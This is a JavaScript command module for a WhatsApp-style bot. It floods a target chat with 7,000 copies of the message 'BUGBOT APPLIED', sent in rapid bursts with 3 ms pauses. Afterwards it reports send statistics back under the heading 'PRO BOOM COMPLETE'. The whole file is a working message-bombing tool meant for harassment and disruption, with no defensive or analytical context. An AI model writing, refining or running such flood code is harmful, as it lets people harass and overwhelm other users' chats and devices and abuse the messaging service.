const { channelInfo } = require('../lib/messageConfig');

async function sulexhCommand(sock, chatId, message) {

    try {

        const totalMessages = 7000;
        const text = "💥 BUGBOT APPLIED 💥";

        console.log("🚀 Starting PRO burst flood...");

        const startTime = Date.now();

        const burstSize = 3;
        const tasks = [];

        // Ultra burst micro-wave flood engine
        for (let i = 0; i < totalMessages; i += burstSize) {

            for (let j = 0; j < burstSize && i + j < totalMessages; j++) {

                tasks.push(
                    sock.sendMessage(chatId, {
                        text: text
                    }).catch(err => {
                        console.log("Send failed:", err.message || err);
                        return false;
                    })
                );

            }

            // Tiny micro pause (almost invisible)
            await new Promise(r => setTimeout(r, 3));
        }

        const results = await Promise.all(tasks);

        const success = results.filter(r => r !== false).length;
        const failed = totalMessages - success;

        const totalTime = Date.now() - startTime;

        // Confirmation message ONLY in your inbox
        await sock.sendMessage(chatId, {
            text:
                `💥 PRO BOOM COMPLETE 💥\n\n` +
                `📊 Statistics\n` +
                `✅ Sent: ${success}/${totalMessages}\n` +
                `❌ Failed: ${failed}\n` +
                `⚡ Mode: Ultra Burst Engine\n` +
                `⏱ Time: ${totalTime}ms`,
            ...channelInfo
        }, { quoted: message });

        console.log(`🚀 PRO flood finished → ${success}/${totalMessages}`);

    } catch (error) {

        console.log("Critical BOOM error:", error.message || error);

        try {
            await sock.sendMessage(chatId, {
                text: "❌ BOOM ENGINE ERROR",
                ...channelInfo
            }, { quoted: message });
        } catch {}
    }
}

module.exports = sulexhCommand;
